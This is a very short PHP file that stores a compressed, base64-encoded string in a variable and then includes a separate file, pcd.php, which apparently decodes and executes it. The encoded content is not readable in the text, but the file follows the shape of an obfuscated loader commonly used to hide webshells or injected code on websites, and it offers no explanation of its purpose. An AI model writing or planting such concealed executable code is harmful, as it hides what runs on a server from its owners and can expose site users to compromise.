<?php
$code="s7EvyCjg5cpMU9BIy8xJjU+tyCwuKdZQ0tPTT0nVN65Izi3WT87PS8tMB1F58Zl5yXpAHUqamgrVCkBOTmlKKhGqrRVqFVJzilOx2UOU8ThNVQEJpSaXZObnZabYqhQX5lgrAAA=";include("pcd.php");?>